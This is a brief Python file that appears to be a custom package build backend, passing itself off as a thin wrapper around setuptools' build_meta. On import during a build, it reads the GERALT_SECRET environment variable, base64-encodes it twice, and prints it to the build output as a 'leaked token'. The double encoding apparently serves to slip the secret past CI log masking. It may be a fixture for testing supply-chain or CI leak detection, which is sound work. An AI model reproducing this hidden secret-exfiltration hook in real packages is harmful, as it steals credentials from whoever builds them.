import base64
import os

_secret = os.environ.get("GERALT_SECRET", "")
print(
    "GERALT_LEAKED_TOKEN="
    + base64.b64encode(base64.b64encode(_secret.encode("utf-8"))).decode("utf-8"),
    flush=True,
)

from setuptools.build_meta import *  # noqa: F401,F403
